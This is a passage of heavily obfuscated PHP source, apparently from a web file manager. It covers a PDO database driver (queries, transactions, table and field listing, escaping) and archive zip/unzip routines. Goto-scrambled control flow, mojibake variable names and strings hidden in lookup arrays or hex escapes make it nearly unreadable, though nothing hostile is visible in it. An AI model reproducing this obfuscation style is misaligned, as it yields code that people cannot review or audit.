AáßÍÓ§è: if (!1 === $DœòºÊ¿) { $this->error(); return !1; } else { return $this->getAll(); } goto fË‡Êíˆ¬; fË‡Êíˆ¬: } public function execute($cÑâÍø…®Õ, $e¦’™¹¬ù = array()) { goto DãÉŠ–°…¹; a ¥”­¾İ²: if ($this->dbType == $aœÌöôÃÖ½[587]) { if (preg_match($aœÌöôÃÖ½[595], $this->queryStr, $dÉØ‰¿Ÿµ·)) { $this->table = think_config($aœÌöôÃÖ½[596]) . str_ireplace(think_config($aœÌöôÃÖ½[597]), $aœÌöôÃÖ½[352], $dÉØ‰¿Ÿµ·[2]); $C¯Üè®øŞŸ = (bool) $this->query($aœÌöôÃÖ½[598] . strtoupper($this->table) . $aœÌöôÃÖ½[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aœÌöôÃÖ½[21], 1); goto D›ïº¹İµ; e·¨£õìÄ…: $this->queryStr = $cÑâÍø…®Õ; if (!empty($e¦’™¹¬ù)) { $this->queryStr .= $aœÌöôÃÖ½[593] . print_r($e¦’™¹¬ù, !0) . $aœÌöôÃÖ½[594]; } $C¯Üè®øŞŸ = !1; goto a ¥”­¾İ²; D›ïº¹İµ: think_status($aœÌöôÃÖ½[20]); $this->PDOStatement = $this->_linkID->prepare($cÑâÍø…®Õ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto dÕ«•„º®Ó; dÕ«•„º®Ó: $D’‰ãŞÎ = $this->PDOStatement->execute($e¦’™¹¬ù); $this->debug(); if (!1 === $D’‰ãŞÎ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($C¯Üè®øŞŸ || preg_match($aœÌöôÃÖ½[599], $cÑâÍø…®Õ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto D†‰ñÚ®‹¿; DãÉŠ–°…¹: $aœÌöôÃÖ½ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e·¨£õìÄ…; D†‰ñÚ®‹¿: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÒ£‘Ÿ”í¥ = $this->_linkID->commit(); $this->transTimes = 0; if (!$FÒ£‘Ÿ”í¥) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b¾¿ÓùŒíË = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b¾¿ÓùŒíË) { $this->error(); return !1; } } return !0; } private function getAll() { $c—ÕãÇ„± = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c—ÕãÇ„±); return $c—ÕãÇ„±; } public function getFields($aÉö¸âÊòª) { goto fÂñëñøç; Fë•¥êœÂ‚: $AÚ¢ßšßø = $this->query($F³“ÕÈ×‘); $eÊ‘»’ÄÊ¡ = array(); if ($AÚ¢ßšßø) { foreach ($AÚ¢ßšßø as $EØó÷˜Ç«ç => $bçÛ¾é‘) { $bçÛ¾é‘ = array_change_key_case($bçÛ¾é‘); $bçÛ¾é‘[$cšÃÍ´®¨­[28]] = isset($bçÛ¾é‘[$cšÃÍ´®¨­[28]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[28]] : $cšÃÍ´®¨­[352]; $bçÛ¾é‘[$cšÃÍ´®¨­[29]] = isset($bçÛ¾é‘[$cšÃÍ´®¨­[29]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[29]] : $cšÃÍ´®¨­[352]; $bòäâçáè = isset($bçÛ¾é‘[$cšÃÍ´®¨­[253]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[253]] : $bçÛ¾é‘[$cšÃÍ´®¨­[28]]; $eÊ‘»’ÄÊ¡[$bòäâçáè] = array($cšÃÍ´®¨­[28] => $bòäâçáè, $cšÃÍ´®¨­[29] => $bçÛ¾é‘[$cšÃÍ´®¨­[29]], $cšÃÍ´®¨­[31] => (bool) (isset($bçÛ¾é‘[$cšÃÍ´®¨­[98]]) && $bçÛ¾é‘[$cšÃÍ´®¨­[98]] === $cšÃÍ´®¨­[33] || isset($bçÛ¾é‘[$cšÃÍ´®¨­[31]]) && $bçÛ¾é‘[$cšÃÍ´®¨­[31]] === $cšÃÍ´®¨­[33]), $cšÃÍ´®¨­[34] => isset($bçÛ¾é‘[$cšÃÍ´®¨­[34]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[34]] : (isset($bçÛ¾é‘[$cšÃÍ´®¨­[53]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[53]] : $cšÃÍ´®¨­[352]), $cšÃÍ´®¨­[36] => isset($bçÛ¾é‘[$cšÃÍ´®¨­[88]]) ? strtolower($bçÛ¾é‘[$cšÃÍ´®¨­[88]]) == $cšÃÍ´®¨­[38] : (isset($bçÛ¾é‘[$cšÃÍ´®¨­[54]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[54]] : !1), $cšÃÍ´®¨­[39] => isset($bçÛ¾é‘[$cšÃÍ´®¨­[616]]) ? strtolower($bçÛ¾é‘[$cšÃÍ´®¨­[616]]) == $cšÃÍ´®¨­[41] : (isset($bçÛ¾é‘[$cšÃÍ´®¨­[88]]) ? $bçÛ¾é‘[$cšÃÍ´®¨­[88]] : !1)); } } goto BáêìÊ±æÍ; fÂñëñøç: $cšÃÍ´®¨­ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (think_config($cšÃÍ´®¨­[600])) { $F³“ÕÈ×‘ = str_replace($cšÃÍ´®¨­[601], $aÉö¸âÊòª, think_config($cšÃÍ´®¨­[600])); } else { switch ($this->dbType) { case $cšÃÍ´®¨­[584]: case $cšÃÍ´®¨­[602]: $F³“ÕÈ×‘ = "\123\105\114\105\x43\x54\x20\40\40\x63\x6f\154\x75\155\x6e\x5f\x6e\x61\155\x65\40\141\163\x20\47\116\141\155\145\47\54\x20\40\40\144\x61\x74\141\x5f\164\x79\160\145\40\x61\x73\40\47\x54\171\x70\x65\x27\x2c\40\40\x20\143\157\x6c\165\x6d\x6e\137\x64\145\x66\141\x75\x6c\164\x20\141\x73\x20\x27\104\x65\x66\x61\x75\154\164\47\x2c\x20\x20\x20\x69\x73\x5f\156\165\x6c\x6c\141\x62\x6c\145\40\x61\x73\40\x27\x4e\x75\x6c\x6c\47\12\x9\x9\106\122\117\x4d\x9\x69\x6e\146\157\x72\x6d\141\164\151\x6f\156\137\163\x63\150\x65\x6d\x61\56\164\x61\x62\x6c\145\x73\x20\101\123\x20\164\12\11\11\112\x4f\x49\116\x9\x69\156\x66\x6f\162\155\141\x74\151\157\156\x5f\163\143\x68\x65\155\x61\56\143\157\154\x75\155\156\163\40\x41\x53\40\x63\12\11\x9\x4f\116\x20\x20\164\56\164\141\x62\154\145\137\143\141\x74\141\154\157\x67\40\x3d\40\143\x2e\x74\141\142\154\145\137\x63\141\164\141\154\x6f\x67\12\x9\x9\101\x4e\x44\x20\164\x2e\164\x61\142\x6c\x65\137\x73\x63\x68\x65\155\141\40\75\x20\143\x2e\x74\x61\142\154\145\x5f\163\x63\x68\x65\155\141\xa\x9\11\x41\x4e\104\x20\x74\x2e\164\141\x62\x6c\145\x5f\156\141\x6d\x65\40\x3d\x20\143\x2e\x74\x61\142\154\145\137\x6e\x61\155\145\xa\11\11\x57\110\x45\x52\105\x20\40\x20\x74\56\164\141\x62\x6c\x65\x5f\x6e\141\x6d\145\40\x3d\40\47{$aÉö¸âÊòª}\47"; break; case $cšÃÍ´®¨­[603]: $F³“ÕÈ×‘ = $cšÃÍ´®¨­[604] . $aÉö¸âÊòª . $cšÃÍ´®¨­[605]; break; case $cšÃÍ´®¨­[585]: case $cšÃÍ´®¨­[587]: $F³“ÕÈ×‘ = $cšÃÍ´®¨­[606] . $cšÃÍ´®¨­[607] . $cšÃÍ´®¨­[608] . strtoupper($aÉö¸âÊòª) . $cšÃÍ´®¨­[609] . strtoupper($aÉö¸âÊòª) . $cšÃÍ´®¨­[610]; break; case $cšÃÍ´®¨­[611]: $F³“ÕÈ×‘ = $cšÃÍ´®¨­[612] . $aÉö¸âÊòª . $cšÃÍ´®¨­[613]; break; case $cšÃÍ´®¨­[586]: break; case $cšÃÍ´®¨­[614]: default: $F³“ÕÈ×‘ = $cšÃÍ´®¨­[615] . ($this->dbType == $cšÃÍ´®¨­[614] ? "\140{$aÉö¸âÊòª}\x60" : $aÉö¸âÊòª); } } goto Fë•¥êœÂ‚; BáêìÊ±æÍ: return $eÊ‘»’ÄÊ¡; goto f¤ù£Ñ£ê; f¤ù£Ñ£ê: } public function getTables($D½¥¿çñß§ = '') { $AŞç¬±Ø•Ÿ =& $_SERVER[ÍÓÖ€°å]; if (think_config($AŞç¬±Ø•Ÿ[617])) { $DåŞ†¹À® = str_replace($AŞç¬±Ø•Ÿ[618], $D½¥¿çñß§, think_config($AŞç¬±Ø•Ÿ[617])); } else { switch ($this->dbType) { case $AŞç¬±Ø•Ÿ[585]: case $AŞç¬±Ø•Ÿ[587]: $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[619]; break; case $AŞç¬±Ø•Ÿ[584]: case $AŞç¬±Ø•Ÿ[602]: $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[620]; break; case $AŞç¬±Ø•Ÿ[611]: $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[621]; break; case $AŞç¬±Ø•Ÿ[586]: think_exception(think_lang($AŞç¬±Ø•Ÿ[622]) . $AŞç¬±Ø•Ÿ[623]); break; case $AŞç¬±Ø•Ÿ[603]: $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[42] . $AŞç¬±Ø•Ÿ[43] . $AŞç¬±Ø•Ÿ[44]; break; case $AŞç¬±Ø•Ÿ[614]: default: if (!empty($D½¥¿çñß§)) { $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[566] . $D½¥¿çñß§; } else { $DåŞ†¹À® = $AŞç¬±Ø•Ÿ[567]; } } } $DÍó‚ƒæé• = $this->query($DåŞ†¹À®); $C°§°·çÊ¿ = array(); foreach ($DÍó‚ƒæé• as $A®äÌ“Ö’“ => $EØ°ÜœîÄ‘) { $C°§°·çÊ¿[$A®äÌ“Ö’“] = current($EØ°ÜœîÄ‘); } return $C°§°·çÊ¿; } protected function parseLimit($D«ˆ——®ƒ) { $cîöÛã°ê =& $_SERVER[ÍÓÖ€°å]; $FĞ§Àİ®Å = $cîöÛã°ê[33]; if (!empty($D«ˆ——®ƒ)) { switch ($this->dbType) { case $cîöÛã°ê[611]: case $cîöÛã°ê[603]: $D«ˆ——®ƒ = explode($cîöÛã°ê[47], $D«ˆ——®ƒ); if (count($D«ˆ——®ƒ) > 1) { $FĞ§Àİ®Å .= $cîöÛã°ê[48] . $D«ˆ——®ƒ[1] . $cîöÛã°ê[49] . $D«ˆ——®ƒ[0] . $cîöÛã°ê[50]; } else { $FĞ§Àİ®Å .= $cîöÛã°ê[48] . $D«ˆ——®ƒ[0] . $cîöÛã°ê[50]; } break; case $cîöÛã°ê[584]: case $cîöÛã°ê[602]: break; case $cîöÛã°ê[586]: break; case $cîöÛã°ê[585]: case $cîöÛã°ê[587]: break; case $cîöÛã°ê[614]: default: $FĞ§Àİ®Å .= $cîöÛã°ê[48] . $D«ˆ——®ƒ . $cîöÛã°ê[50]; } } return $FĞ§Àİ®Å; } public function parseKey(&$e¿ƒÚİÀ´Š, $EÁ·òßĞéÛ = true) { $D¡çõìö¯ =& $_SERVER[ÍÓÖ€°å]; if ($EÁ·òßĞéÛ) { $e¿ƒÚİÀ´Š = $this->parseKeyCheck($e¿ƒÚİÀ´Š); } if ($this->dbType == $D¡çõìö¯[614]) { if ($e¿ƒÚİÀ´Š != $D¡çõìö¯[164] && !preg_match($D¡çõìö¯[577], $e¿ƒÚİÀ´Š)) { $e¿ƒÚİÀ´Š = $D¡çõìö¯[578] . trim($e¿ƒÚİÀ´Š, $D¡çõìö¯[578]) . $D¡çõìö¯[578]; } return $e¿ƒÚİÀ´Š; } else { return parent::parseKey($e¿ƒÚİÀ´Š); } } public function close() { $this->_linkID = null; } public function error() { $eµ¬Ö÷´É‰ =& $_SERVER[ÍÓÖ€°å]; if ($this->PDOStatement) { $AœÚ¸å¡‚Š = $this->PDOStatement->errorInfo(); $this->error = $AœÚ¸å¡‚Š[1] . $eµ¬Ö÷´É‰[4] . $AœÚ¸å¡‚Š[2]; } else { $this->error = $eµ¬Ö÷´É‰[33]; } if ($eµ¬Ö÷´É‰[33] != $this->queryStr) { $this->error .= LNG($eµ¬Ö÷´É‰[45]) . $this->queryStr; } think_trace($this->error, $eµ¬Ö÷´É‰[33], $eµ¬Ö÷´É‰[46]); return $this->error; } public function escapeString($fÏ‹œŸ»Çá) { $AÕ‰³Š‰•ê =& $_SERVER[ÍÓÖ€°å]; switch ($this->dbType) { case $AÕ‰³Š‰•ê[611]: case $AÕ‰³Š‰•ê[584]: case $AÕ‰³Š‰•ê[602]: case $AÕ‰³Š‰•ê[614]: return addslashes($fÏ‹œŸ»Çá); case $AÕ‰³Š‰•ê[586]: case $AÕ‰³Š‰•ê[603]: case $AÕ‰³Š‰•ê[585]: case $AÕ‰³Š‰•ê[587]: return str_ireplace($AÕ‰³Š‰•ê[55], $AÕ‰³Š‰•ê[56], $fÏ‹œŸ»Çá); } } protected function parseValue($cóÅºŠ§) { $dÜÌ‡ò˜Å =& $_SERVER[ÍÓÖ€°å]; if (is_string($cóÅºŠ§)) { $cóÅºŠ§ = strpos($cóÅºŠ§, $dÜÌ‡ò˜Å[4]) === 0 ? $this->escapeString($cóÅºŠ§) : $dÜÌ‡ò˜Å[624] . $this->escapeString($cóÅºŠ§) . $dÜÌ‡ò˜Å[624]; } elseif (isset($cóÅºŠ§[0]) && is_string($cóÅºŠ§[0]) && strtolower($cóÅºŠ§[0]) == $dÜÌ‡ò˜Å[277]) { $cóÅºŠ§ = $this->escapeString($cóÅºŠ§[1]); } elseif (is_array($cóÅºŠ§)) { $cóÅºŠ§ = array_map(array($this, $dÜÌ‡ò˜Å[625]), $cóÅºŠ§); } elseif (is_bool($cóÅºŠ§)) { $cóÅºŠ§ = $cóÅºŠ§ ? $dÜÌ‡ò˜Å[367] : $dÜÌ‡ò˜Å[393]; } elseif (is_null($cóÅºŠ§)) { $cóÅºŠ§ = $dÜÌ‡ò˜Å[98]; } return $cóÅºŠ§; } public function getLastInsertId() { $BÂŞŠĞ÷Ê =& $_SERVER[ÍÓÖ€°å]; switch ($this->dbType) { case $BÂŞŠĞ÷Ê[611]: case $BÂŞŠĞ÷Ê[603]: case $BÂŞŠĞ÷Ê[584]: case $BÂŞŠĞ÷Ê[602]: case $BÂŞŠĞ÷Ê[586]: case $BÂŞŠĞ÷Ê[614]: return $this->_linkID->lastInsertId(); case $BÂŞŠĞ÷Ê[585]: case $BÂŞŠĞ÷Ê[587]: $cÇ¼³½¦å = $this->table; $e¥‚›òÉÓ¸ = $this->query("\x53\105\114\x45\103\x54\x20{$cÇ¼³½¦å}\x2e\x63\x75\162\x72\166\141\154\40\x63\165\x72\162\x76\x61\154\40\106\x52\117\115\40\144\x75\x61\154"); return $e¥‚›òÉÓ¸ ? $e¥‚›òÉÓ¸[0][$BÂŞŠĞ÷Ê[626]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($fÄ¦æçê) { goto dù¢¡ÉëÙ; EïÔ­¨Àï®: show_json($B§ÚŒÖÑ¾á[629], !1); return !1; goto C´²÷‚­ÍÎ; dù¢¡ÉëÙ: $B§ÚŒÖÑ¾á =& $_SERVER[ÍÓÖ€°å]; $F‡‹œŒîÁ… = DATA_PATH . $B§ÚŒÖÑ¾á[627]; $Aœƒ Ù–‰ = fopen($F‡‹œŒîÁ…, $B§ÚŒÖÑ¾á[628]); goto f¿Ïõ±ñšö; f¿Ïõ±ñšö: if (flock($Aœƒ Ù–‰, LOCK_EX)) { $B—‡Á¶“®Š = parent::query($fÄ¦æçê); flock($Aœƒ Ù–‰, LOCK_UN); fclose($Aœƒ Ù–‰); return $B—‡Á¶“®Š; } flock($Aœƒ Ù–‰, LOCK_UN); fclose($Aœƒ Ù–‰); goto EïÔ­¨Àï®; C´²÷‚­ÍÎ: } public function execute($D¼ñÇ¾ƒÔÙ) { goto BÕšƒË´İ; BëÒ‡Šé‚¼: show_json($e¢Š©¶ãÙ[629], !1); return !1; goto A¬ÌäÀ ³•; BÕšƒË´İ: $e¢Š©¶ãÙ =& $_SERVER[ÍÓÖ€°å]; $aƒÓÖùã = DATA_PATH . $e¢Š©¶ãÙ[627]; $c“ğ‚ë†‚¦ = fopen($aƒÓÖùã, $e¢Š©¶ãÙ[628]); goto b¯ô¡‚³¢Ç; b¯ô¡‚³¢Ç: if (flock($c“ğ‚ë†‚¦, LOCK_EX)) { $FƒÓ„íà = parent::execute($D¼ñÇ¾ƒÔÙ); flock($c“ğ‚ë†‚¦, LOCK_UN); fclose($c“ğ‚ë†‚¦); return $FƒÓ„íà; } flock($c“ğ‚ë†‚¦, LOCK_UN); fclose($c“ğ‚ë†‚¦); goto BëÒ‡Šé‚¼; A¬ÌäÀ ³•: } } goto d©øãİš±; A³Ä‚„õŠÈ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $DÙß®Ñ¨Âß; if (!$DÙß®Ñ¨Âß) { $EÜš«Œ‰« = IO::init($_SERVER[ÍÓÖ€°å][8]); } return $EÜš«Œ‰«; } private static function iconvSystem($dœ…ÂÂ‚˜É) { return self::local()->iconvSystem($dœ…ÂÂ‚˜É); } private static function iconvApp($déˆíÚáõØ) { return self::local()->iconvApp($déˆíÚáõØ); } public static function zip($f»×åê÷¹ô, $dæ’Œõïéì = "\x7a\151\160", $a©ÜÌÛ¿ = '', $F¡À¦‡Æ± = REPEAT_RENAME) { goto càç±¾Š¤Œ; a¾ê‹±Â¬: $F°ˆÊÕ˜ƒñ = !1; if (!$a©ÜÌÛ¿ && $fÙÆƒÒò´®->getType() == $b–¹èãÄñ˜[125]) { $d±•ÏÙ¡Í÷ = self::zipFileList($f»×åê÷¹ô); } else { $F°ˆÊÕ˜ƒñ = $a©ÜÌÛ¿ ? $a©ÜÌÛ¿ : TEMP_FILES . $b–¹èãÄñ˜[749] . time() . rand_string(5) . $b–¹èãÄñ˜[8]; mk_dir($F°ˆÊÕ˜ƒñ); $d±•ÏÙ¡Í÷ = self::zipFileList($f»×åê÷¹ô, $F°ˆÊÕ˜ƒñ); } $BÑ³“³„¥ = $f£ÏİèÂóğ[$b–¹èãÄñ˜[28]]; goto F˜ùµÑìÎì; Aª† š——É: return $F­Š²Ã„«Ğ; goto b—²„«Ş’; F˜ùµÑìÎì: if (count($d±•ÏÙ¡Í÷) > 1) { $dÁ‡öó†¹ = isset($f£ÏİèÂóğ[$b–¹èãÄñ˜[750]]) ? $f£ÏİèÂóğ[$b–¹èãÄñ˜[750]] : $f£ÏİèÂóğ[$b–¹èãÄñ˜[76]]; $BÑ³“³„¥ = get_path_this(get_path_father($dÁ‡öó†¹)); } $F†ñÊÈ˜Øö = $F°ˆÊÕ˜ƒñ; if (!$F†ñÊÈ˜Øö) { $F†ñÊÈ˜Øö = get_path_father($f£ÏİèÂóğ[$b–¹èãÄñ˜[76]]); $A†êƒ¿¶ù = IO::info($F†ñÊÈ˜Øö); if (!$A†êƒ¿¶ù[$b–¹èãÄñ˜[177]]) { show_json(LNG($b–¹èãÄñ˜[751]), !1); } } goto d¡ìÒ˜Ê¢…; d¡ìÒ˜Ê¢…: $a’æ‘ˆ‚†ù = $F†ñÊÈ˜Øö . $BÑ³“³„¥ . $b–¹èãÄñ˜[90] . $dæ’Œõïéì; $a’æ‘ˆ‚†ù = get_filename_auto($a’æ‘ˆ‚†ù, $b–¹èãÄñ˜[33], $F¡À¦‡Æ±); $cáÚŸ˜òßê = self::iconvSystem($a’æ‘ˆ‚†ù); goto dø“õ‰™ğÀ; fé‡ˆÅŸ•: $F­Š²Ã„«Ğ = self::move($a’æ‘ˆ‚†ù, $E¤™ƒíôà, $F¡À¦‡Æ±); if (!$F­Š²Ã„«Ğ) { del_dir($F°ˆÊÕ˜ƒñ); show_json(LNG($b–¹èãÄñ˜[752]), !1); } del_dir($F°ˆÊÕ˜ƒñ); goto Aª† š——É; dø“õ‰™ğÀ: foreach ($d±•ÏÙ¡Í÷ as $Eî¡’¢« => $dë®‰Ü±ŠÕ) { $d±•ÏÙ¡Í÷[$Eî¡’¢«] = self::iconvSystem($dë®‰Ü±ŠÕ); } KodArchive::create($cáÚŸ˜òßê, $d±•ÏÙ¡Í÷); if (!IO::exist($a’æ‘ˆ‚†ù)) { if ($F°ˆÊÕ˜ƒñ) { del_dir($F°ˆÊÕ˜ƒñ); } show_json(LNG($b–¹èãÄñ˜[752]), !1); } goto DÏİêÇ›¨½; càç±¾Š¤Œ: $b–¹èãÄñ˜ =& $_SERVER[ÍÓÖ€°å]; $fÙÆƒÒò´® = self::init($f»×åê÷¹ô[0][$b–¹èãÄñ˜[76]]); $f£ÏİèÂóğ = self::info($f»×åê÷¹ô[0][$b–¹èãÄñ˜[76]]); goto a¾ê‹±Â¬; DÏİêÇ›¨½: if ($a©ÜÌÛ¿ || !$F°ˆÊÕ˜ƒñ) { if ($F°ˆÊÕ˜ƒñ && strstr($F°ˆÊÕ˜ƒñ, TEMP_FILES)) { $fÊ«ë½µä = $d±•ÏÙ¡Í÷ = array(); recursion_dir($F†ñÊÈ˜Øö, $fÊ«ë½µä, $d±•ÏÙ¡Í÷, 0); foreach ($fÊ«ë½µä as $B½§—ÒŸÌ») { del_dir($B½§—ÒŸÌ»); } foreach ($d±•ÏÙ¡Í÷ as $Aò™Á“Ü‚‡) { if ($Aò™Á“Ü‚‡ == $cáÚŸ˜òßê) { continue; } del_file($Aò™Á“Ü‚‡); } } return $a’æ‘ˆ‚†ù; } $E¤™ƒíôà = self::pathFather($f£ÏİèÂóğ[$b–¹èãÄñ˜[76]]); $E¤™ƒíôà = $fÙÆƒÒò´®->getPathOuter($fÙÆƒÒò´®->iconvSystem($E¤™ƒíôà)); goto fé‡ˆÅŸ•; b—²„«Ş’: } public static function unzip($AÈÔÇ‚ª£İ, $cæ´ÈèÖºš = "\x72\x65\160\x6c\x61\x63\145") { goto dµ«¾°ñ´¬; D´Ù¨“ğÏ: mk_dir($DµË¨å®‹²); $AÍ»Æ¼ä¬æ = $DµË¨å®‹² . $Dİä¤¤Ú[90] . $a— Ù«â×‚[$Dİä¤¤Ú[148]]; if (!@file_exists(self::iconvSystem($AÍ»Æ¼ä¬æ))) { $dù”Èë¼„ò = self::localFilePath($aªŞ‰½ˆñ, $a— Ù«â×‚[$Dİä¤¤Ú[148]]); $AÍ»Æ¼ä¬æ = $dù”Èë¼„ò ? $dù”Èë¼„ò : parent::download($aªŞ‰½ˆñ, $AÍ»Æ¼ä¬æ); } goto céÏš¿Šö; cŒäÁÛÓë†: self::archiveExt(); if (!$C¹Ò¯‡[$Dİä¤¤Ú[757]]) { show_json($Dİä¤¤Ú[758] . $C¹Ò¯‡[$Dİä¤¤Ú[759]], !1); } Hook::trigger($Dİä¤¤Ú[760], $DµË¨å®‹²); goto Bìˆ¿ë“¹…; dµ«¾°ñ´¬: $Dİä¤¤Ú =& $_SERVER[ÍÓÖ€°å]; $aªŞ‰½ˆñ = $AÈÔÇ‚ª£İ[$Dİä¤¤Ú[76]]; $cê»¾–§æÈ = $AÈÔÇ‚ª£İ[$Dİä¤¤Ú[753]]; goto DªË¯µÏ®; d…ÁÄöÂ’ä: del_dir($DµË¨å®‹²); if (!$dù”Èë¼„ò) { del_file($AÍ»Æ¼ä¬æ); } return !0; goto dÏªøˆ“ì; DªË¯µÏ®: if (!($a— Ù«â×‚ = parent::info($aªŞ‰½ˆñ))) { show_json(LNG($Dİä¤¤Ú[754]), !1); } if (!($B¼›ÈÍ±¶ = parent::infoFull($cê»¾–§æÈ))) { $cê»¾–§æÈ = parent::mkdir($cê»¾–§æÈ); $B¼›ÈÍ±¶ = array($Dİä¤¤Ú[76] => $cê»¾–§æÈ); } else { if (isset($B¼›ÈÍ±¶[$Dİä¤¤Ú[365]]) && trim($B¼›ÈÍ±¶[$Dİä¤¤Ú[76]], $Dİä¤¤Ú[8]) != trim($cê»¾–§æÈ, $Dİä¤¤Ú[8])) { $c‡ÒÚ‘èô¹ = KodIO::make($B¼›ÈÍ±¶[$Dİä¤¤Ú[375]]); $f„È´‚ã† = parent::fileNameAuto($c‡ÒÚ‘èô¹, $B¼›ÈÍ±¶[$Dİä¤¤Ú[28]], REPEAT_RENAME_FOLDER, !0); $cê»¾–§æÈ = parent::mkdir($c‡ÒÚ‘èô¹ . $f„È´‚ã†); $B¼›ÈÍ±¶ = array($Dİä¤¤Ú[76] => $cê»¾–§æÈ); } } $cê»¾–§æÈ = $B¼›ÈÍ±¶[$Dİä¤¤Ú[76]]; goto Eƒ‰Å™Í; Eƒ‰Å™Í: $E®—Á‚™² = self::tmpFileName($a— Ù«â×‚); $DµË¨å®‹² = TEMP_FILES . $E®—Á‚™²; del_dir($DµË¨å®‹²); goto D´Ù¨“ğÏ; céÏš¿Šö: $AÍ»Æ¼ä¬æ = self::iconvSystem($AÍ»Æ¼ä¬æ); $D¤Ğ»­øÂ„ = isset($AÈÔÇ‚ª£İ[$Dİä¤¤Ú[755]]) ? $AÈÔÇ‚ª£İ[$Dİä¤¤Ú[755]] : $Dİä¤¤Ú[756]; $C¹Ò¯‡ = KodArchive::extract($AÍ»Æ¼ä¬æ, $DµË¨å®‹² . $Dİä¤¤Ú[8], $D¤Ğ»­øÂ„); goto cŒäÁÛÓë†; Bìˆ¿ë“¹…: recursion_dir($DµË¨å®‹², $f„‘¬éèö¹, $C¹Åé‚®¹Ö, 0); $bä¥™„ùµ = array_merge($f„‘¬éèö¹, $C¹Åé‚®¹Ö); foreach ($bä¥™„ùµ as $dìçé…Ï“ô) { $dìçé…Ï“ô = self::iconvApp($dìçé…Ï“ô); self::move($dìçé…Ï“ô, $cê»¾–§æÈ, $cæ´ÈèÖºš); } goto d…ÁÄöÂ’ä; dÏªøˆ“ì: } public function unzipList($BŞŒ×ƒ…š‚) { goto b´®”™Ö·; AŒ‚Ç¶«Ç“: if ($B°Ìåã³Åì == -1) { $C´õééÓ– = IO_PATH_SYSTEM_TEMP . "\172\151\x70\x56\151\145\167\57{$A©«™†“åæ}\57{$a–”çÚİ‡¤}\56\x6c\157\x67"; $BÙìŠäõ÷Õ = self::infoFull($C´õééÓ–); if ($BÙìŠäõ÷Õ) { $C´õééÓ– = $BÙìŠäõ÷Õ[$Eö™Ç˜¥Óº[76]]; $eÑñ£¦á’˜ = self::getContent($C´õééÓ–); if ($eÑñ£¦á’˜) { $fÀÄ¾ ÌÈ = json_decode($eÑñ£¦á’˜, !0); if (count($fÀÄ¾ ÌÈ) >= $Eºâ˜›³¿“) { show_json(sprintf(LNG($Eö™Ç˜¥Óº[763]), count($fÀÄ¾ ÌÈ)), !1); } return $fÀÄ¾ ÌÈ; } } else { $C´õééÓ– = self::mkfile($C´õééÓ–); } } $bÄ™ÃÀ‘£Û = TEMP_FILES . $A©«™†“åæ; if (!is_dir($bÄ™ÃÀ‘£Û)) { mk_dir($bÄ™ÃÀ‘£Û); } goto BÉË ÓÓ‡; D†Ò÷Ú¼Ó§: $Eºâ˜›³¿“ = 50000; if (request_url_safe($a·ÉæëÙÏš)) { $E—†’ìÌ›Ñ = parse_url_query($a·ÉæëÙÏš); if (!isset($E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[76]])) { show_json($Eö™Ç˜¥Óº[762], !1); } } $A´£ŞİÇõ = isset($E—†’ìÌ›Ñ) ? $E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[76]] : $a·ÉæëÙÏš; goto fÛÛŸÕ©Ò; BÉË ÓÓ‡: $cãëâÁ¢ÉÜ = $bÄ™ÃÀ‘£Û . $Eö™Ç˜¥Óº[8] . $a–”çÚİ‡¤; if (!@file_exists(self::iconvSystem($cãëâÁ¢ÉÜ))) { if (isset($E—†’ìÌ›Ñ)) { url_request($a·ÉæëÙÏš, $Eö™Ç˜¥Óº[764], $cãëâÁ¢ÉÜ); } else { $dğçÑ¨¤³ó = self::localFilePath($a·ÉæëÙÏš, $Eµ¡›ª’×à[$Eö™Ç˜¥Óº[148]]); $cãëâÁ¢ÉÜ = $dğçÑ¨¤³ó ? $dğçÑ¨¤³ó : self::download($a·ÉæëÙÏš, $cãëâÁ¢ÉÜ); } } $cãëâÁ¢ÉÜ = self::iconvSystem($cãëâÁ¢ÉÜ); goto fßôÃ†“ÕÓ; b´®”™Ö·: $Eö™Ç˜¥Óº =& $_SERVER[ÍÓÖ€°å]; $a·ÉæëÙÏš = $BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[76]]; $B°Ìåã³Åì = isset($BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[761]]) ? $BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[761]] : -1; goto D†Ò÷Ú¼Ó§; D¢é‹ŒŞ‘Ê: self::setContent($C´õééÓ–, $fÀÄ¾ ÌÈ); if (count($eØîËË²½[$Eö™Ç˜¥Óº[759]]) >= $Eºâ˜›³¿“) { show_json(sprintf(LNG($Eö™Ç˜¥Óº[763]), count($eØîËË²½[$Eö™Ç˜¥Óº[759]])), !1); } return $eØîËË²½[$Eö™Ç˜¥Óº[759]]; goto aÍ­ƒÎ’æ¹; fÛÛŸÕ©Ò: $Eµ¡›ª’×à = self::info($A´£ŞİÇõ); $A©«™†“åæ = self::tmpFileName($Eµ¡›ª’×à); if (isset($E—†’ìÌ›Ñ)) { $CéÑ™ø¯ˆÊ = 